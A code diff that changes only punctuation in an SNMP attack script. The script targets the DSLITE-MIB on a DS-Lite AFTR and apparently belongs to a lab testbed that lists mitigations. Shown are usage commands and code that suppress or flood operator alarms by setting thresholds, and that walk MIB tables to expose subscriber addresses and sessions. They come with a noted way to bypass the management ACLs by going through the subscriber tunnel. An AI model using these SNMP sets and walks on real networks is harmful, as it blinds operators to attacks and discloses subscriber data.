@@ -1,6 +1,6 @@
 #!/usr/bin/python
-# T14 – SNMP Threshold Manipulation (Alarm Suppression / Alarm Flooding)
-# T15 – MIB Information Disclosure
+# T14 - SNMP Threshold Manipulation (Alarm Suppression / Alarm Flooding)
+# T15 - MIB Information Disclosure
 #
 # RFC 7870 defines the DSLITE-MIB (IANA mib-2.240 = 1.3.6.1.2.1.240)
 # with three subtrees: dsliteTunnel, dsliteNAT, dsliteInfo.
@@ -8,24 +8,24 @@
 # The dsliteInfo subtree contains three WRITABLE alarm threshold scalars
 # under dsliteAFTRAlarmScalar (.1.3.1):
 #
-#   dsliteAFTRAlarmConnectNumber (.1)  – tunnel count alarm threshold (default 60)
-#   dsliteAFTRAlarmSessionNumber (.2)  – per-user session alarm threshold (default -1 = disabled)
-#   dsliteAFTRAlarmPortNumber    (.3)  – NAT port usage alarm threshold (default -1 = disabled)
+#   dsliteAFTRAlarmConnectNumber (.1)  - tunnel count alarm threshold (default 60)
+#   dsliteAFTRAlarmSessionNumber (.2)  - per-user session alarm threshold (default -1 = disabled)
+#   dsliteAFTRAlarmPortNumber    (.3)  - NAT port usage alarm threshold (default -1 = disabled)
 #
 # These thresholds control three SNMP notifications (traps):
-#   dsliteTunnelNumAlarm           – fires when tunnels > ConnectNumber
-#   dsliteAFTRUserSessionNumAlarm  – fires when sessions > SessionNumber
-#   dsliteAFTRPortUsageOfSpecificIpAlarm – fires when ports > PortNumber
+#   dsliteTunnelNumAlarm           - fires when tunnels > ConnectNumber
+#   dsliteAFTRUserSessionNumAlarm  - fires when sessions > SessionNumber
+#   dsliteAFTRPortUsageOfSpecificIpAlarm - fires when ports > PortNumber
 #
 # Attackers with SNMP write access (or default community strings) can:
 #
-#   T14 – MANIPULATION:
+#   T14 - MANIPULATION:
 #     a) Suppress alarms: set ConnectNumber to max → AFTR never triggers alerts
 #        during concurrent attacks (T1 NAT exhaustion goes unnoticed by NOC)
 #     b) Generate alarm floods: set thresholds to 0 → constant alerts
 #        cause operator desensitization, masking real attacks
 #
-#   T15 – DISCLOSURE:
+#   T15 - DISCLOSURE:
 #     a) Walk dsliteTunnelTable → reveals B4 IPv6 addresses, tunnel names,
 #        subscriber topology, prefix lengths, encapsulation type
 #     b) Walk dsliteNATBindTable → reveals active subscriber sessions,
@@ -42,21 +42,21 @@
 # Target: AFTR SNMP agent (snmp_agent.py) on UDP/161 at the OAM IP 10.99.0.1.
 #
 # Attacker position: P3 (operator OAM network) is the textbook case, BUT this tool
-# also runs from P1 — ANY subscriber LAN host behind a B4 (a malicious customer, no
+# also runs from P1 - ANY subscriber LAN host behind a B4 (a malicious customer, no
 # compromise required). A subscriber's route to 10.99.0.1 goes through the DS-Lite
 # softwire, so its SNMP is encapsulated (outer IPv6 proto-4) and bypasses the
 # eth-isp/eth-wan udp/161 ACLs; the AFTR decapsulates it and the inner udp/161
 # reaches the agent. Verified: pcaps/per_attack/T15/T15_3 (LAN) + T15_4 (tunnel).
 #
 # Usage:
-#   # T15 – read MIB tables:
+#   # T15 - read MIB tables:
 #   python3 snmp_attack.py read --target 127.0.0.1 --oids tunnel,nat,thresholds
 #
-#   # T14 – suppress alarms:
+#   # T14 - suppress alarms:
 #   python3 snmp_attack.py set --target 127.0.0.1 \
 #       --oid alarmConnectNumber --value 4294967295
 #
-#   # T14 – generate alarm flood:
+#   # T14 - generate alarm flood:
 #   python3 snmp_attack.py set --target 127.0.0.1 \
 #       --oid alarmConnectNumber --value 0
 import argparse
@@ -85,7 +85,7 @@ KNOWN_OIDS = {
     # dsliteNAT subtree (.1.2)
     'natBindCount':       OID_BASE + (1, 2, 2, 0),
 
-    # dsliteInfo.dsliteAFTRAlarmScalar (.1.3.1) — EXACT RFC 7870 §8 order.
+    # dsliteInfo.dsliteAFTRAlarmScalar (.1.3.1) - EXACT RFC 7870 §8 order.
     # Notify-identity objects first (.1-.5), then the WRITABLE thresholds (.6-.8):
     'alarmB4AddrType':    OID_BASE + (1, 3, 1, 1),  # B4 address type in alarm
     'alarmB4Addr':        OID_BASE + (1, 3, 1, 2),  # B4 address that triggered alarm
@@ -96,7 +96,7 @@ KNOWN_OIDS = {
     'alarmSessionNumber': OID_BASE + (1, 3, 1, 7),  # per-user session threshold (default -1, WRITABLE)
     'alarmPortNumber':    OID_BASE + (1, 3, 1, 8),  # NAT port-usage threshold (default -1, WRITABLE)
 
-    # dsliteStatisticsTable (.1.3.2) — Counter64 per-subscriber stats
+    # dsliteStatisticsTable (.1.3.2) - Counter64 per-subscriber stats
     'statsDiscards':      OID_BASE + (1, 3, 2, 1),
     'statsSends':         OID_BASE + (1, 3, 2, 2),
     'statsReceives':      OID_BASE + (1, 3, 2, 3),
@@ -196,7 +196,7 @@ def encode_oid(oid_tuple):
 def build_get_request(community, oid_tuple, txid=None):
     """Build SNMPv2c GetRequest PDU.
 
-    RFC 3416 §4.1 — request-id (txid) must be unique-per-request so the
+    RFC 3416 §4.1 - request-id (txid) must be unique-per-request so the
     response can be correlated; fixed/sequential values trip IDS rules.
     """
     if txid is None:
@@ -221,7 +221,7 @@ def build_set_request(community, oid_tuple, int_value, txid=None):
     on-wire encoding never exceeds 4 bytes (avoiding "wrong length for
     VarBind/value" rejects from strict agents).
 
-    RFC 3416 §4.1 — request-id must be unique-per-request.
+    RFC 3416 §4.1 - request-id must be unique-per-request.
     """
     if txid is None:
         txid = random.randint(1, 0x7FFFFFFF)
@@ -417,29 +417,29 @@ def parse_oid_arg(oid_str):
 
 def main():
     p = argparse.ArgumentParser(
-        description="T14/T15 – SNMP Threshold Manipulation and MIB Disclosure\n"
+        description="T14/T15 - SNMP Threshold Manipulation and MIB Disclosure\n"
                     "Targets the RFC 7870 DSLITE-MIB (IANA mib-2.240) on the AFTR.",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 RFC 7870 DSLITE-MIB structure (IANA OID 1.3.6.1.2.1.240):
 
-  dsliteTunnel (.1.1)         – softwire tunnel entries
+  dsliteTunnel (.1.1)         - softwire tunnel entries
     tunnelCount, tunnelAddrType, tunnelStartAddr (B4 IPv6),
     tunnelEndAddr (AFTR IPv6), tunnelStartPreLen, tunnelName, tunnelEncaps
 
-  dsliteNAT (.1.2)            – extended NAT binding table
+  dsliteNAT (.1.2)            - extended NAT binding table
     natBindCount, natProtocol, natExtAddr, natExtPort,
     natIntAddr, natIntPort, natDstAddr, natDstPort,
     natMapBehavior, natFilterBehavior, natPooling, natRaw
 
-  dsliteInfo (.1.3)           – statistics + alarm thresholds
+  dsliteInfo (.1.3)           - statistics + alarm thresholds
     dsliteAFTRAlarmScalar (.1.3.1):
-      alarmConnectNumber (.1) – tunnel count threshold (default 60, WRITABLE)
-      alarmSessionNumber (.2) – per-user sessions (default -1, WRITABLE)
-      alarmPortNumber    (.3) – NAT port usage (default -1, WRITABLE)
-      alarmB4Addr        (.4) – alarm identity: B4 address
-      alarmProtocolType  (.5) – alarm identity: protocol
-      alarmSpecificIP    (.6) – alarm identity: specific IP
+      alarmConnectNumber (.1) - tunnel count threshold (default 60, WRITABLE)
+      alarmSessionNumber (.2) - per-user sessions (default -1, WRITABLE)
+      alarmPortNumber    (.3) - NAT port usage (default -1, WRITABLE)
+      alarmB4Addr        (.4) - alarm identity: B4 address
+      alarmProtocolType  (.5) - alarm identity: protocol
+      alarmSpecificIP    (.6) - alarm identity: specific IP
     dsliteStatisticsTable (.1.3.2):
       statsDiscards, statsSends, statsReceives, statsIPv4Sessions, statsIPv6Sessions
 
@@ -450,7 +450,7 @@ RFC 7870 DSLITE-MIB structure (IANA OID 1.3.6.1.2.1.240):
 OID groups for --oids:
   tunnel, nat, thresholds, alarms, statistics, system, all
 
-T14 – Alarm manipulation examples:
+T14 - Alarm manipulation examples:
   # Suppress all alarms (set tunnel threshold to max → NOC blind to T1 attack):
   python3 snmp_attack.py set --target 127.0.0.1 \\
       --oid alarmConnectNumber --value 4294967295
@@ -463,7 +463,7 @@ T14 – Alarm manipulation examples:
   python3 snmp_attack.py set --target 127.0.0.1 \\
       --oid alarmPortNumber --value 0
 
-T15 – Disclosure examples:
+T15 - Disclosure examples:
   # Enumerate tunnel topology (subscriber B4 IPv6 addresses):
   python3 snmp_attack.py read --target 127.0.0.1 --oids tunnel
 
@@ -494,7 +494,7 @@ T15 – Disclosure examples:
                    help='Integer value to SET')
     args = p.parse_args()
 
-    print(f"[*] T14/T15 – SNMP Attack on DS-Lite AFTR")
+    print(f"[*] T14/T15 - SNMP Attack on DS-Lite AFTR")
     print(f"[*] Target: {args.target}:{args.port}  Community: {args.community}")
     print(f"[*] MIB: DSLITE-MIB (RFC 7870, IANA mib-2.240)")
     print()
@@ -506,7 +506,7 @@ T15 – Disclosure examples:
             p.error('--value required for set action')
         oid = parse_oid_arg(args.oid)
         oid_str_display = '.'.join(map(str, oid))
-        print(f"[*] T14 – Setting {args.oid} ({oid_str_display}) = {args.value}")
+        print(f"[*] T14 - Setting {args.oid} ({oid_str_display}) = {args.value}")
         err, oid_resp, val = snmp_set(args.target, args.port, args.community, oid, args.value)
         if err == 0:
             print(f"[+] SET successful: {oid_resp} = {val}")
@@ -532,12 +532,12 @@ T15 – Disclosure examples:
             print(f"    dsliteAFTRAlarmConnectNumber now = {_rb_val} "
                   f"(Integer32 max {INT32_MAX}); the tunnel-count alarm can never trip")
             print("    → dsliteTunnelNumAlarm will NEVER fire")
-            print("    → Run T1 NAT exhaustion concurrently – NOC blind to attack")
+            print("    → Run T1 NAT exhaustion concurrently - NOC blind to attack")
         elif oid_name == 'alarmConnectNumber' and args.value == 0:
             print("[!] T14 alarm FLOOD active:")
             print("    dsliteAFTRAlarmConnectNumber set to 0")
             print("    → dsliteTunnelNumAlarm fires constantly")
-            print("    → Operator desensitization – real attacks masked by noise")
+            print("    → Operator desensitization - real attacks masked by noise")
         elif oid_name == 'alarmSessionNumber' and args.value >= 0:
             print(f"[!] T14: dsliteAFTRAlarmSessionNumber set to {args.value}")
             if args.value == 0:
@@ -564,7 +564,7 @@ T15 – Disclosure examples:
             else:
                 oid_names.append(part)
 
-        print(f"[*] T15 – MIB Information Disclosure: querying {len(oid_names)} OIDs")
+        print(f"[*] T15 - MIB Information Disclosure: querying {len(oid_names)} OIDs")
         print(f"[*] RFC 7870 §7: 'Unauthorized read access violates subscriber privacy'")
         print()
 
@@ -592,7 +592,7 @@ T15 – Disclosure examples:
 
         print()
         if found_sensitive:
-            print(f"[!] T15 – {len(found_sensitive)} sensitive values disclosed:")
+            print(f"[!] T15 - {len(found_sensitive)} sensitive values disclosed:")
             for name, val in found_sensitive:
                 if 'tunnel' in name.lower():
                     if 'StartAddr' in name:
@@ -627,7 +627,7 @@ T15 – Disclosure examples:
             print("Mitigation:")
             print("  - Implementations MUST include full SNMPv3 USM with AES")
             print("  - Deployment of SNMPv2c is NOT RECOMMENDED (RFC 7870 §7)")
-            print("  - Restrict SNMP to the management VLAN — BUT interface/VLAN ACLs")
+            print("  - Restrict SNMP to the management VLAN - BUT interface/VLAN ACLs")
             print("    alone are INSUFFICIENT: tunnelled subscriber traffic decapsulates")
             print("    onto the OAM subnet. ALSO drop subscriber-range -> OAM-subnet on")
             print("    the AFTR (e.g. nft: ip saddr 10.0.0.0/16 ip daddr 10.99.0.0/24 drop).")
